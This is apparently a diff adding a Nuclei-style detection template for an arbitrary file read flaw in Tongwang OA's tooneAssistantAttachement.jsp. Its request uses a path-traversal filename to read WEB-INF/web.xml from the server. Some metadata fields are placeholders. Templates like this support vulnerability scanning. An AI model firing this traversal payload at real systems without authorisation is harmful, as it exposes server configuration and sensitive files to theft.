@@ -1,0 +1,20 @@
+id: twoa-tooneAssistantAttachement-lfi
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 同望OA系统接口tooneAssistantAttachement.jsp任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%90%8C%E6%9C%9BOA/%E5%90%8C%E6%9C%9BOA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3tooneAssistantAttachement.jsp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
